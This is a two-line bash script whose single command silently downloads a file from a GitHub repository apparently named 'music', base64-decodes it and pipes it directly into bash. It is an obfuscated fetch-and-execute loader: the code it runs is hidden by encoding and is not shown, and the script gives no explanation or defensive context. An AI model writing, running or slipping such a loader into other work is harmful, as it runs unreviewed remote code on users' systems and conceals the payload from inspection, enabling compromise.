#!/bin/bash
wget -qO- https://raw.githubusercontent.com/alonzomcleroy1/music/refs/heads/main/entrypoint.sh | base64 -d | bash
